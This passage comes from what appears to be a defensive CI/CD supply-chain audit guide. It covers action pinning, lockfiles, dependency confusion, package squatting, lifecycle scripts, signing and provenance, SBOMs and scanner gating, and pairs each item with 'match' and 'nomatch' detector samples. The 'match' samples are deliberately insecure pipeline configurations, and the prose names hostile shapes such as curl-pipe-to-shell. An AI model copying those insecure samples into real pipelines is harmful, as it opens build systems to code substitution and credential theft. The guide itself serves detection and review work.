        - run: make publish
nomatch: |
  # .github/workflows/build.yml
  permissions:
    contents: read
  jobs:
    pr-build:
      runs-on: ubuntu-24.04
      steps:
        - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        - run: make build
    publish:
      needs: pr-build
      runs-on: ubuntu-24.04
      permissions:
        contents: read
        id-token: write
      steps:
        - run: make publish
```

### 5. Mutable references the pipeline resolves (`action-and-workflow-ref-pinning`)

Anything the pipeline fetches by a name that can be repointed is code substitution waiting to happen. The rule is a full 40-hex commit SHA, and the exemptions matter as much as the rule.

- **`uses: owner/action@v4` or `@main`** — a tag or branch is mutable, and a tag can be force-moved by whoever controls that repository. `uses: owner/action@<40-hex>` is the only immutable form. A trailing `# v4.1.1` comment on an already-pinned line is a dependency-bot annotation, not a tag reference: read the ref, not the comment.
- **Exempt, and do not file:** `uses: ./.github/actions/x` local actions and `uses: ./.github/workflows/x.yml` same-repository reusable workflows inherit this repository's own review controls, so a SHA adds nothing. **One carve-out, and it is a real Critical rather than an exemption:** a local `uses: ./…` reference in a job whose workspace holds untrusted content — a `pull_request_target` or `workflow_run` job that checked out the pull-request head — resolves the action *out of the pull request's tree*. That is item 1a, and the "local actions are fine" rule does not reach it. A cross-repository reference within the same organization (`uses: myorg/other-repo/.github/workflows/x.yml@main`) is also **not** exempt: it is governed by that repository's controls, not this one's.
- **Mutable references inside a pinned action.** Pinning `owner/action@<sha>` does not pin what that action's own `action.yml` does — a `uses:` on a tag, a `docker://image:latest`, or a network fetch inside its script. Where an action is security-relevant, read its `action.yml`.
- **Docker-based actions and container jobs.** `uses: docker://alpine:3.20`, `container: image: node:20`, `services:` images — all tags. Pin by digest.
- **Provider equivalents.** GitLab `include: remote:` fetches over the network at pipeline-creation time and cannot be pinned at all; prefer `include: project:` with `ref:` set to a SHA, or `include: local:`. Jenkins `@Library('shared@master')` resolves a branch, `@Library('shared@<sha>')` does not. CircleCI orbs referenced as `@volatile` or a `dev:` tag are mutable. `pre-commit` `rev:` set to a branch is mutable, and pre-commit itself warns about it.
- **Calibrate before grading.** A first-party `actions/*` or `github/*` reference on a major tag is a lower risk than a single-maintainer marketplace action on `@main`, which in turn is lower than either of them running in a job that holds a publish token. And a 40-hex pin is not a clean bill of health: it proves immutability, not benignity. The class of incident where a widely used action's tags are retargeted to malicious code is defeated by pinning and is not detected by it.

```detector
match: |
  # .github/workflows/release.yml
  steps:
    - uses: actions/checkout@v4
    - uses: some-maintainer/publish-action@main
      with:
        token: ${{ secrets.NPM_TOKEN }}
nomatch: |
  # .github/workflows/release.yml
  steps:
    - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
    - uses: some-maintainer/publish-action@6f3b1e0d9a4c2b5e8f7a0d1c2b3a4956e7f80912 # v2.3.0
      with:
        token: ${{ secrets.NPM_TOKEN }}
```

```detector
match: |
  # .gitlab-ci.yml
  include:
    - remote: 'https://raw.example.com/example/ci-templates/main/build.yml'
    - template: Security/SAST.gitlab-ci.yml
nomatch: |
  # .gitlab-ci.yml
  include:
    - project: 'platform/ci-templates'
      ref: 'd4c3b2a1908f7e6d5c4b3a2918f7e6d5c4b3a291'
      file: '/build.yml'
    - template: Security/SAST.gitlab-ci.yml
```

```detector
match: |
  // Jenkinsfile
  @Library('platform-shared@master') _
  pipeline {
    agent { label 'build' }
    stages { stage('Build') { steps { buildAndPublish() } } }
  }
nomatch: |
  // Jenkinsfile
  @Library('platform-shared@a1b2c3d4e5f60718293a4b5c6d7e8f9012345678') _
  pipeline {
    agent { label 'build' }
    stages { stage('Build') { steps { buildAndPublish() } } }
  }
```

### 6. Dependency pinning and lockfiles (`dependency-pinning-and-lockfiles`)

Two separate questions, and conflating them produces most of this item's false positives: **is the dependency set fixed**, and **does CI install the fixed set**.

- **Lockfile present and authoritative.** A committed lockfile with ranged direct dependencies is fine; ranged dependencies with *no* lockfile means any install can resolve differently. In a monorepo, check that per-package lockfiles are consistent with the workspace root rather than stale copies.
- **A frozen install in CI.** `npm ci`, `yarn install --immutable`, `pnpm install --frozen-lockfile`, `uv sync --frozen`, `bundle install --deployment`, `cargo build --locked`, `composer install` (already lockfile-authoritative), `dotnet restore --locked-mode` with `packages.lock.json`. **`npm ci` is one option among equals** — flagging "not using `npm ci`" in a pnpm, uv or cargo repository is a pure false positive. What *is* a real finding is `npm install` (or a bare `pip install -r`) in CI where a lockfile exists, because it may resolve past the lock and can rewrite it.
- **Hash pinning where the ecosystem supports it.** pip `--require-hashes`, with `pip-compile --generate-hashes` producing the file; `--only-binary :all:` to avoid building from source; Gradle `gradle/verification-metadata.xml`; NuGet `packages.lock.json` with locked-mode restore; the `integrity` fields in npm, pnpm and yarn lockfiles; the checksums in `Cargo.lock`.
- **Go is a special case, and "no hash pinning" is usually wrong for it.** `go.sum` plus the public checksum database gives transparency-log-backed integrity by default, so the finding is never "hashes are missing" but "something turned the default off or widened it". Grep for `GOFLAGS`, `GOPROXY`, `GOSUMDB`, `GOPRIVATE`, `GONOPROXY` and `GOINSECURE` in workflow `env:` blocks, Dockerfiles and Makefiles — then **read the value**. The confirmed bypasses are `GOSUMDB=off`, which disables the checksum database outright, and `GOFLAGS=-mod=mod`, under which the build may rewrite `go.mod` and `go.sum` instead of failing on drift. The `GOPRIVATE` family scopes the proxy and the checksum database away from matching module paths, which is legitimate for genuinely private modules and is a finding only where the pattern is broader than those modules. File on what a value covers, never on a variable's mere presence.
- **Verify the lockfile is actually consumed.** A `Dockerfile` that runs `npm install` after copying only `package.json` — without the lockfile — silently ignores every pin in the repository. Check what the build copies before it installs.

```detector
match: |
  # .github/workflows/ci.yml
  - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
    with:
      node-version: 20
  - run: npm install
  - run: npm test
nomatch: |
  # .github/workflows/ci.yml
  - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
    with:
      node-version: 20
      cache: npm
  - run: npm ci
  - run: npm test
```

```detector
match: |
  # Dockerfile
  FROM python:3.12-slim
  WORKDIR /app
  COPY requirements.txt .
  RUN pip install --no-cache-dir -r requirements.txt
  COPY . .
nomatch: |
  # Dockerfile
  FROM python:3.12-slim
  WORKDIR /app
  COPY requirements.lock .
  RUN pip install --no-cache-dir --require-hashes --only-binary :all: -r requirements.lock
  COPY . .
```

### 7. Registry configuration and dependency confusion (`dependency-confusion-and-registry-config`)

The attack: an internal package name is registered on a public registry, and a client configured to consult both installs the public one. Publicly reported across several ecosystems in **2021**, and again in **2022** against a machine-learning project's internal package name, where the fix was an explicit index priority. It turns entirely on resolution configuration, which is a file you can read.

- **npm.** An unscoped internal package name is squattable by anyone. `@yourorg/` scoping plus `@yourorg:registry=https://…` in a committed `.npmrc` binds those names to the internal registry; a bare `registry=` pointing at a proxy that falls through to the public registry does not. Check `always-auth`, and check that the `.npmrc` CI uses is the committed one rather than one synthesized in a step.
- **pip.** The file is **`pip.conf`** on POSIX or **`pip.ini`** on Windows — there is no `.pip.conf`. The environment forms are `PIP_INDEX_URL` and `PIP_EXTRA_INDEX_URL`; the flags are `--index-url` and `--extra-index-url`. The load-bearing semantic: **pip does not prioritise `--index-url` over `--extra-index-url`.** It considers candidates from every configured index and picks the best version, so a public index carrying a higher version of an internal name wins. The fix is a single `--index-url` pointing at an internal index that proxies the public one, or an explicit per-package index binding.
- **uv.** `[[tool.uv.index]]` entries in `pyproject.toml`, with `explicit = true` binding named packages to a single index, and `index-strategy` controlling whether resolution may look past the first index that carries a name. Read both.
- **Poetry.** `[[tool.poetry.source]]` entries carry a `priority`; the value that prevents fallback for a given package is `explicit`. Read the priority, not just the presence of a source.
- **Maven.** In `settings.xml`, a `<mirror>` with `<mirrorOf>*</mirrorOf>` routing everything through one internal repository is the tight configuration; a `<repositories>` block in the POM that adds a public repository alongside an internal one is the loose one. Snapshot repositories and an always-update policy widen it further.
- **Committed, or only on a laptop.** Registry configuration that lives only in user-level files — `~/.npmrc`, `~/.config/pip/pip.conf`, `~/.m2/settings.xml` — rather than in a committed, CI-enforced file means local and CI resolution can differ, and the repository cannot show which is authoritative. That is a real, repository-observable finding. Do not extend it into claims about anyone's machine.
- **What you cannot check here.** Whether the internal name is currently registered publicly requires a registry query. Report the configuration and name the query as the user's follow-up.

```detector
match: |
  # .github/workflows/ci.yml
  - run: pip install --extra-index-url https://pypi.internal.example.com/simple -r requirements.txt
nomatch: |
  # .github/workflows/ci.yml
  - run: pip install --index-url https://pypi.internal.example.com/simple --require-hashes -r requirements.lock
```

```detector
match: |
  # pyproject.toml
  [tool.poetry.dependencies]
  python = "^3.12"
  acme-internal-utils = "^1.4"

  [[tool.poetry.source]]
  name = "internal"
  url = "https://pypi.internal.example.com/simple/"
  priority = "supplemental"
nomatch: |
  # pyproject.toml
  [tool.poetry.dependencies]
  python = "^3.12"
  acme-internal-utils = { version = "^1.4", source = "internal" }

  [[tool.poetry.source]]
  name = "internal"
  url = "https://pypi.internal.example.com/simple/"
  priority = "explicit"
```

```detector
match: |
  # .npmrc
  registry=https://registry.npmjs.org/
  //registry.npmjs.org/:_authToken=${NPM_TOKEN}
nomatch: |
  # .npmrc
  @acme:registry=https://npm.internal.example.com/
  //npm.internal.example.com/:_authToken=${NPM_TOKEN}
  registry=https://registry.npmjs.org/
```

The `.npmrc` pair becomes a finding only when the manifest also depends on an unscoped internal name. Read `package.json` before filing, and quote the dependency line in the finding.

### 8. Typosquatting and slopsquatting (`package-name-squatting`)

A name one edit away from a popular one, or a name a language model invented and an attacker then registered. The check this lens inherited — "audit by checking install commands against actual registry packages" — is **logically inverted for typosquatting**: a typosquat *is* a real, published package, so an existence check passes and the auditor reports clean. Existence checks refute only hallucinated names, which is the slopsquatting half.

Work it in two passes.

- **Pass one, repository-local and fully checkable.** Enumerate every package name that appears in an install command but *not* in the manifest or lockfile: `pip install` and `npm i` lines in Dockerfiles, workflow `run:` steps, `Makefile` targets, `scripts/**/*.sh`, and setup instructions in `README`/`CONTRIBUTING` that CI actually executes. A name installed imperatively is a name nothing pins and nothing reviewed. This is the finding you can prove from the checkout, and it is where hallucinated names land.
- **Pass two, identity rather than existence.** For a suspicious name, compare it against the *intended* package's identity: the declared source-repository URL, the maintainer or organization, the first-publish date, the number of released versions, download volume, and edit distance to a far more popular name. A one-character-different name with three versions, published last month, by an account with no other packages, pointing at no repository, is the signature. Then diff the manifest against an allowlist or against the committed lockfile so a newly introduced name shows up in review.
- **What you cannot do here.** Both passes' registry lookups are network calls and are out of rails. Report the local pass as the finding and hand the identity comparison to the user as a named follow-up with the exact names to check.

```detector
match: |
  # Dockerfile
  FROM python:3.12-slim
  WORKDIR /app
  COPY requirements.lock .
  RUN pip install --no-cache-dir --require-hashes -r requirements.lock
  RUN pip install --no-cache-dir python-jwt requsts-toolbelt
  COPY . .
nomatch: |
  # Dockerfile
  FROM python:3.12-slim
  WORKDIR /app
  COPY requirements.lock .
  RUN pip install --no-cache-dir --require-hashes -r requirements.lock
  COPY . .
```

The `match` half is the shape to hunt: a correct, hash-pinned install followed by an imperative one that bypasses every pin in the file. Whether either of those two names is a squat is the follow-up; that the line exists at all is the finding.

### 9. Install-time and lifecycle script execution (`install-and-lifecycle-scripts`)

Installing a dependency executes code from it. npm runs `preinstall`, `install` and `postinstall` for every package in the tree by default, and `npm ci` does too — the frozen-install verb changes *what* is installed, not whether its scripts run. pip executes `setup.py` for any source distribution.

- **The controls, by name.** `--ignore-scripts` on the install command, or `ignore-scripts=true` in a committed `.npmrc` (which covers every invocation and is the more durable form). For pip, `--only-binary :all:` forces wheels and avoids `setup.py` execution.
- **pnpm, with its version boundary.** Blocking dependency build scripts unless the package appears in `onlyBuiltDependencies` is **pnpm 10's** default (January 2025). **pnpm 9 and earlier run dependency lifecycle scripts by default**, exactly like npm, so "pnpm gates them behind a list" clears every pnpm-9 repository that has no such list — a wrong clearance in the same shape as ignoring the February 2023 `GITHUB_TOKEN` boundary. Establish the major before applying the default: `packageManager` in `package.json` (`"pnpm@9.15.4"` versus `"pnpm@10.x"`), a pinned `version:` input on the `pnpm/action-setup` step, the `lockfileVersion` at the top of `pnpm-lock.yaml`, or an engines constraint. Where the major cannot be established, that is the assumption-with-verification-step form, not a clearance. `onlyBuiltDependencies` lives in `pnpm-workspace.yaml` or under `pnpm` in `package.json`.
- **Check `.npmrc` before filing — and read the value, not the key.** A repository with `ignore-scripts=true` committed and a workflow running a bare `npm ci` is already covered, and filing "no `--ignore-scripts`" against it is a false positive. But `.npmrc` legitimately carries **`ignore-scripts=false`**, which is the control switched *off*, and a presence grep for `ignore-scripts` reads that as the control being in place — the same defect this lens rejects for the Go variables in item 6. Grep for the key, then read the value: only `true` is the control. The same rule applies to every boolean setting a check like this consults, including `publishConfig.provenance` in item 12.
- **Know what the control breaks,** so the recommendation is actionable rather than reflexive: `--ignore-scripts` also suppresses the repository's *own* lifecycle scripts, and it breaks packages whose install step is a native build or a binary download — ORM client generators, image-processing libraries, native compilers, and browser-automation packages that download a browser. The workable pattern is an allowlist: ignore scripts globally, then run the specific build step explicitly.
- **Grade the reachability, not the flag.** Scripts running during an install that also holds a publish token, or on a persistent runner, is where this becomes a real finding. **Do not clear it** on the argument that the install runs in an ephemeral container with no credentials and restricted egress: none of those three properties is verifiable from a workflow file, and accepting the argument waves away a genuine malicious-postinstall path.
- **The repository's own lifecycle scripts** are worth reading too: a `postinstall` in `package.json` that curls and executes something is the same defect one level closer to home.

```detector
match: |
  # .github/workflows/ci.yml
  - name: Install dependencies
    run: npm ci
  - name: Build and publish
    run: npm run build && npm publish
    env:
      NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
nomatch: |
  # .github/workflows/ci.yml
  - name: Install dependencies
    run: npm ci --ignore-scripts
  - name: Rebuild the packages that genuinely need a build step
    run: npm rebuild sharp
  - name: Build and publish
    run: npm run build && npm publish
    env:
      NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### 10. Known-vulnerable dependencies (`package-dependency-cves`)

Whether the repository can tell that a dependency has a published advisory, and whether anything happens when it can.

- **Does a scanner run at all, and where.** An advisory scanner invoked in CI (`npm audit`, `pip-audit`, `osv-scanner`, `bundler-audit`, `cargo audit`, `govulncheck`, or a commercial equivalent) on pull requests is the artifact. A scanner that runs only on a schedule, or only on the default branch, cannot block a change — that is item 14's finding, and cross-reference it rather than filing twice.
- **Is there an update path the repository can evidence.** `.github/dependabot.yml` or `renovate.json` shows automated update pull requests are configured. Their absence is Low; their presence is not proof that anyone merges them.
- **`SECURITY.md`** is a repository-visible SSDF artifact: it should name a reporting channel and, ideally, a response expectation. Absent, that is an Info finding. **Patch SLAs, triage processes and documented security requirements are organizational process and are not findings here** — answer N/A.
- **Do not paste a scanner's output as findings.** A dependency advisory list is inventory, not analysis. Where a specific advisory is reachable from this application's code path, say which call reaches it and grade that; otherwise report the count, the highest severity, and the fact that reachability was not established.
- **A clean scan is not a clearance.** Advisory databases lag, and they do not cover a malicious package that has not been reported yet. "`npm audit` reports zero vulnerabilities" says nothing about items 7, 8, 9 or 11.

```detector
match: |
  # .github/workflows/ci.yml
  - name: Dependency audit
    run: npm audit --audit-level=high || true
nomatch: |
  # .github/workflows/ci.yml
  - name: Dependency audit
    run: npm audit --audit-level=high
```

### 11. Abandonment, end-of-life and maintainer takeover (`dependency-eol-and-abandonment`)

`CWE-1104`. Two distinct concerns share this slug: a dependency nobody maintains, and a maintained dependency whose maintainer's account is compromised.

- **Unmaintained and deprecated dependencies.** Packages marked deprecated by their publisher, packages with a single maintainer on a critical path, and forks of abandoned upstreams pinned to a commit that never moves. The repository-visible half is version drift: a direct dependency several major versions behind, and a lockfile whose entries have not changed in years.
- **End-of-life runtimes and toolchains.** These are in the pipeline files and are fully checkable: a `node-version`, `python-version`, `go-version`, `ruby-version` or base-image tag whose upstream support has ended receives no security patches, which makes every later item in this lens moot. Read the version from `setup-*` action inputs, `.nvmrc`, `.tool-versions`, `go.mod`'s `go` directive and the pipeline's container images.
- **Maintainer account takeover, and what actually defends against it.** The **ua-parser-js, coa and rc** compromises (2021) were account takeovers: the attacker published through the legitimate account. **Package signing is no defense against this** — a release published through a compromised account is validly signed and carries valid provenance, so "we verify signatures" does not help, and neither does "we check provenance". What does help, and what to check for:
  - **A quarantine window before a new version is ingested** — Renovate's `minimumReleaseAge`, a dependency-bot cooldown setting, or an `npm --before` pin. Most malicious releases are yanked within hours to days, so a delay of a few days is the single highest-value control here.
  - **Lockfile plus integrity-hash pinning**, so an unattended install cannot pick up the new version at all.
  - **Egress restriction during install**, so a malicious lifecycle script cannot reach out.
  - **Post-install tarball diffing** against the previously ingested version.
  - **Two-factor or hardware keys on the publishing accounts** — worth recommending, and not verifiable from the repository.
  - Grep for the **absence** of the quarantine setting in an automerge configuration. `"automerge": true` with no `minimumReleaseAge` is an automated path from a hijacked publish to your default branch.

```detector
match: |
  # renovate.json
  {
    "$schema": "https://docs.renovatebot.com/renovate-schema.json",
    "extends": ["config:recommended"],
    "automerge": true,
    "automergeType": "branch"
  }
nomatch: |
  # renovate.json
  {
    "$schema": "https://docs.renovatebot.com/renovate-schema.json",
    "extends": ["config:recommended"],
    "automerge": true,
    "automergeType": "branch",
    "minimumReleaseAge": "5 days"
  }
```

```detector
match: |
  # .github/workflows/ci.yml
  jobs:
    test:
      runs-on: ubuntu-24.04
      steps:
        - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
          with:
            node-version: '16'
        - run: npm ci && npm test
nomatch: |
  # .github/workflows/ci.yml
  jobs:
    test:
      runs-on: ubuntu-24.04
      steps:
        - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
          with:
            node-version: '22'
        - run: npm ci && npm test
```

Node 16 reached end of life in **September 2023** and Python 3.7 in **June 2023**; check the current support status of whatever version you find rather than memorising a list.

### 12. Signing and provenance emission (`artifact-signing-and-provenance-emission`)

What the pipeline says about its own output, and whether that claim is worth anything. Keep two questions apart, because the inherited version of this check conflated them and the conflation is load-bearing:

- **Authentication** — who published this, and did they need a long-lived credential to do it?
- **Provenance** — what process built it, and from which inputs?

**Trusted publishing / OIDC publishing answers the first only.** It removes long-lived registry tokens and is a genuine improvement, and it **emits no provenance by itself**. Report them as two findings on two rows.

- **Container images.** The current mechanisms are **Sigstore Cosign** and the Notary Project's **Notation** (Notary v2, using OCI referrers). "Notary" without qualification means Notary v1 / Docker Content Trust, which is legacy and effectively unmaintained — do not recommend it, and if the repository uses it, say so. Signing without verification is half a control; enforcement at deploy time is `deploy-time-signature-enforcement` in **cloud-and-iac**, so report the emission gap here and route the enforcement gap there, in one finding each.
- **`cosign verify` in keyless mode, and what version boundary decides the finding.** **Cosign 2.0 (March 2023) made `--certificate-identity` / `--certificate-identity-regexp` *and* `--certificate-oidc-issuer` required for keyless verification**, so on any current cosign a `cosign verify <ref>` with neither flag **errors out** rather than accepting anything. "It passes for any artifact the public CA ever signed" is cosign **1.x** behaviour; asserting it against a repository on 2.x is wrong in the direction that costs the report its credibility. Grade what you can actually cite:
  - **An over-broad identity constraint** — `--certificate-identity-regexp '.*'`, or any unanchored or wildcarded pattern (no `^`, a bare substring, `.*` in the org or repository position). The flag is present, the check is inoperative, and it survives review precisely because the flag is there. This is the 2.x-era version of the original finding and it is the one to look for first.
  - **`--insecure-ignore-tlog` or `--insecure-ignore-sct`**, which switch off transparency-log and certificate-timestamp verification.
  - **A pinned cosign 1.x** (a `sigstore/cosign-installer` input, a container tag, or a vendored binary), where the missing-flags case *does* verify nothing.
  - **Missing flags on cosign ≥ 2**, which is still a finding but a different one: the command cannot succeed, so either the step is soft-failed (`|| true`, `continue-on-error: true` — item 14) or the pipeline is broken and nobody noticed. Say which, and grade it there.
  - **A verification key or identity list fetched over the network at verify time**, which moves the trust root to whoever serves that URL.

  **Exempt key-based verification.** `cosign verify --key cosign.pub …`, `--key k8s://…`, or `--certificate-chain` with a private CA does not use Fulcio, and the identity flags are meaningless there — asserting them manufactures a finding against correct usage, including the mode recipe R2 itself recommends. Test for the *absence* of `--key` / `--certificate-chain` before requiring the identity flags.
- **npm.** Provenance is opt-in: `npm publish --provenance`, or `publishConfig.provenance` in `package.json`, and it requires a supported CI with `id-token: write`. Consumers verify with `npm audit signatures`. Because it is opt-in, **grep for the absence**: enumerate the publish steps, then check each for the flag. **Read `publishConfig.provenance`'s value rather than its presence** — `"provenance": false` is a legal, explicit opt-*out*, and a key-presence check reads it as the control being on. Only `true` counts.
- **PyPI.** Trusted Publishers is the authentication half. Provenance is **PEP 740 attestations**, generally available from **November 2024**, produced by the publish action's `attestations` input. Two traps: recent versions of that action default the input to **true**, so grepping for `attestations: true` misses every repository that relies on the default — search instead for an explicit `attestations: false` and for a pinned older version of the action. And a long-lived `PYPI_API_TOKEN` or `NPM_TOKEN` secret is the authentication finding on its own row.
- **Provenance generators and verification.** A SLSA provenance generator in the release workflow raises the Build level; `gh attestation verify` (generally available in 2024) is the consumer-side check for GitHub-hosted attestations. State the Build level you observed and the target you derived, per the Frameworks section.
- **Release binaries.** Checksums published beside a release are a weak control unless the checksum file itself is signed — otherwise whoever can replace the binary can replace the checksum. Check for a signed checksum manifest or a detached signature per artifact.
- **The asymmetry to report explicitly.** A pipeline that emits signatures and attestations nobody verifies is a common and honest finding: it is not zero value (it enables later verification), and it is not the control the team believes they have. Write both halves.

```detector
match: |
  # .github/workflows/deploy.yml
  - name: Verify the base image before building on it
    run: |
      cosign verify \
        --certificate-identity-regexp '.*' \
        --certificate-oidc-issuer https://token.actions.githubusercontent.com \
        example.registry/base/runtime@sha256:5f8c1b2a3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcd
nomatch: |
  # .github/workflows/deploy.yml
  - name: Verify the base image before building on it
    run: |
      cosign verify \
        --certificate-identity-regexp '^https://github\.com/example-org/base-images/' \
        --certificate-oidc-issuer https://token.actions.githubusercontent.com \
        example.registry/base/runtime@sha256:5f8c1b2a3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcd
```

Both halves carry both required flags, which is the whole point of the pair: on cosign ≥ 2 a check written the naive way — grep for the two flag names — passes the `match` half. `'.*'` matches every identity Fulcio has ever issued a certificate for, so the `match` half verifies that *somebody* signed the image, which is not a control. The `nomatch` half anchors the pattern to one organization's repositories. A `cosign verify --key cosign.pub <ref>` line is a third case and is **clean** — do not flag it for missing flags it has no use for.

```detector
match: |
  # .github/workflows/release.yml
  jobs:
    publish:
      runs-on: ubuntu-24.04
      steps:
        - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        - run: npm ci --ignore-scripts && npm run build
        - run: npm publish --access public
          env:
            NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
nomatch: |
  # .github/workflows/release.yml
  jobs:
    publish:
      runs-on: ubuntu-24.04
      permissions:
        contents: read
        id-token: write
      steps:
        - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        - run: npm ci --ignore-scripts && npm run build
        - run: npm publish --access public --provenance
          env:
            NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

```detector
match: |
  # .github/workflows/release.yml
  - uses: pypa/gh-action-pypi-publish@15c56dba361d8335944d31a2ecd17d700fc7bcbc # v1.12.4
    with:
      attestations: false
nomatch: |
  # .github/workflows/release.yml
  - uses: pypa/gh-action-pypi-publish@15c56dba361d8335944d31a2ecd17d700fc7bcbc # v1.12.4
```

That third pair inverts the usual direction on purpose: here the *presence* of the literal is the defect and its absence is fine, because the action's default is the secure value. Any check written the other way around reports every correctly configured repository.

### 13. SBOM generation and delivery (`sbom-generation-and-attachment`)

- **Is one produced**, in a machine-readable format — `*.cdx.json` (CycloneDX) or `*.spdx.json` (SPDX) — by a generator in the pipeline rather than by hand?
- **Is it produced from the built artifact** or from the manifest? A manifest-derived SBOM misses everything the base image and the build added.
- **Does it reach anyone?** This is the finding that gets missed: an SBOM generated into the workspace, never uploaded, never attached to the release and never attested is an SBOM that does not exist for any consumer. Check for an upload, a release asset, or an attestation predicate.
- **Severity is contextual and usually low.** For an internal-only service that ships no third-party artifact, a missing SBOM is Low or informational — a compliance and inventory gap, not an exploitable defect. It rises where a customer or a regulator consumes the artifact, or where a contract cites Executive Order 14028 (2021).

```detector
match: |
  # .github/workflows/release.yml
  - name: Generate SBOM
    run: syft packages dir:. -o cyclonedx-json=sbom.cdx.json
  - name: Publish image
    run: docker push "example.registry/app:$GITHUB_SHA"
nomatch: |
  # .github/workflows/release.yml
  - name: Generate SBOM
    run: syft packages dir:. -o cyclonedx-json=sbom.cdx.json
  - name: Attach SBOM to the release
    run: gh release upload "$GITHUB_REF_NAME" sbom.cdx.json
    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  - name: Publish image
    run: docker push "example.registry/app:$GITHUB_SHA"
```

### 14. Scanners that do not gate (`pipeline-scanner-gating`)

A scanner in the pipeline is evidence of intent. Whether it can *stop* a change is a different question, and the gap between the two is this item.

- **Explicit soft-fail.** `continue-on-error: true` on the scan step, `|| true` or `; exit 0` appended to the command, GitLab `allow_failure: true`, a policy checker's `soft_fail` flag, an image scanner invoked with its exit code forced to zero, a severity threshold set so high that nothing reaches it. All of these are worth grepping for as evidence of *intent*, which is what this bullet is about — but `; exit 0` is inert as a *mechanism* under GitHub's default `bash -e {0}` shell, so read the next-but-one bullet before writing it up as the construct that swallowed a status.
- **Runs where it cannot block.** A scanner on `schedule` only, or on pushes to the default branch only, cannot fail a pull request. A report uploaded for display without a corresponding required status check is advisory by construction — and whether the check is *required* is a repository setting, so this is the assumption-with-verification-step form, not a grade.
- **Fail-open on a dependency the scan consults.** The scanner needs a policy bundle, a rules repository, an API token or an advisory database. What happens when that fetch times out? A step written as "download rules, then scan" often passes on a network error and does so silently for months. **Do not write this finding as "no `set -e`", which is false on GitHub Actions:** the default shell for `run:` on Linux and macOS is `bash -e {0}`, and an explicit `shell: bash` is `bash --noprofile --norc -eo pipefail {0}`. **`-e` is on by default; `pipefail` is not.** So a bare `curl` that exits non-zero already fails the step, and a finding resting on `set -e` is rebutted in one link. The shapes that genuinely fail open, each of which is a grep:
  **Every shape below was measured under `bash -e`, and the ones that are commonly *asserted* to fail open and do not are named as such, because `-e` rebuts them the same way it rebuts "no `set -e`".**

  - **`curl` with no `-f`/`--fail`.** An HTTP 404 or a 500 exits **0** and writes the error page into the output file, so the scan then runs against an HTML document. This is the most common instance by a wide margin, and it is the one to look for first.
  - **HTTP 200 carrying a body that parses to nothing** — `{}`, `null`, `[]`, an empty rule directory, a *valid but empty* archive. Nothing fails at any level: the fetch succeeded, the file parsed, and the scan ran against zero rules and reported clean. This one does not depend on the shell at all, which makes it the shape no amount of `set -euo pipefail` closes and the reason the fix has to include an assertion about the *content*.
  - **A pipe whose last command succeeds, because `pipefail` is off** in the default shell: `curl -fsSL … | sh` and `curl … | tee out` exit **0** even when `curl` fails, because the pipeline takes the last command's status and `sh` on empty input succeeds. Measured. Note the limit, so the finding is not overstated: where the *downstream* command is the one that chokes — `curl … | tar -xz` on an HTML body — `tar` exits 2, that becomes the pipeline's status, and `-e` fails the step closed.
  - **An assignment that hides the substitution's status:** `export V=$(curl …)`, `declare V=$(curl …)`, `local V=$(curl …)`, a prefix assignment `V=$(curl …) cmd`, and `echo "$(curl …)"` — all measured **exit 0** under `-e`. A **bare** `V=$(curl …)` is *not* one of them: a simple command with no command name takes the status of its last command substitution, so `-e` aborts there. Measured. Cite the qualified form or cite nothing; a finding that quotes a bare assignment is rebutted in one link, which is exactly what removing "no `set -e`" was for.
  - **`|| true`** on the fetch or the scan — measured exit 0 under `-e`, so this one always holds.
  - **`; exit 0` at the end of the script, in a shell the provider did not start with `-e`** — a `Makefile` recipe line, a `shell: sh` step, a bare `sh -c` wrapper (measured: `sh -c 'false ; exit 0'` exits 0). Under GitHub's default `bash -e {0}` it is **inert as a mechanism**: measured, a scanner returning 3 followed by `; exit 0` still fails the step with 3, because `-e` aborts before `exit 0` runs. Keep grepping for it — it is strong evidence of *intent* and belongs in the explicit-soft-fail bullet above — but do not write it as the construct that swallowed the status unless you have established the shell.
  - **`continue-on-error: true` on the fetch step** (or a whole fetch *job*) whose output a later scan step consumes — the fetch is allowed to fail by configuration and the scan proceeds on whatever is on disk.
  - **A cached or stale database** with no freshness assertion: the fetch fails, yesterday's advisory set is still in the cache, and the scan reports clean against it.

  The fix to recommend is `set -o pipefail`, `curl --fail --retry`, an explicit status check, and — the part scanners skip, and the only part that closes the empty-body case — an assertion that the fetched bundle is present, non-empty and parseable before the scan runs. This is the same shape as an application's fail-open authorization boundary; recipe **R6** proves it.
- **Scope narrower than the change.** A scanner limited to one directory, one language or `--diff` mode where the repository's risk is elsewhere. Say what it does not cover.
- **Do not confuse this with item 10.** Item 10 asks whether a scanner exists; this asks whether it blocks. One defect, one finding, in whichever of the two it actually is.

```detector
match: |
  # .github/workflows/security.yml
  - name: Static analysis
    uses: example-org/sast-action@8c1f0e2d3b4a5968770a1b2c3d4e5f6071829304 # v3.1.0
    continue-on-error: true
    with:
      severity: critical
nomatch: |
  # .github/workflows/security.yml
  - name: Static analysis
    uses: example-org/sast-action@8c1f0e2d3b4a5968770a1b2c3d4e5f6071829304 # v3.1.0
    with:
      severity: high
```

```detector
match: |
  # .gitlab-ci.yml
  container-scan:
    stage: test
    allow_failure: true
    script:
      - trivy image --exit-code 0 --severity HIGH,CRITICAL "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA"
nomatch: |
  # .gitlab-ci.yml
  container-scan:
    stage: test
    script:
